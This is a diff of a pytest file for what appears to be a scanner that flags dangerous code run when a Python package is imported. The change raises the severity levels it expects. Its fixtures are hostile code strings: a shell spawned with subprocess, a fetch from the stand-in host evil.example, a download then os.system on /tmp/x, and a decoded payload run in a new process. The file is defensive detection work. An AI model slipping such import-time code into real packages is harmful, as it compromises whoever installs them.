@@ -375,11 +375,11 @@ def test_import_time_calls_follow_functions_run_on_import(start: str) -> None:
 @pytest.mark.parametrize(
     ("init_py", "severity"),
     [
-        ("import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])", "medium"),
-        ("import urllib.request\nurllib.request.urlopen('https://evil.example')", "medium"),
+        ("import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])", "high"),
+        ("import urllib.request\nurllib.request.urlopen('https://evil.example')", "high"),
         (  # download, then run
             "import os, requests\nrequests.get(u)\nos.system('/tmp/x')",
-            "high",
+            "critical",
         ),
         (  # run a decoded payload in a new Python process
             "import subprocess, sys, base64\n"
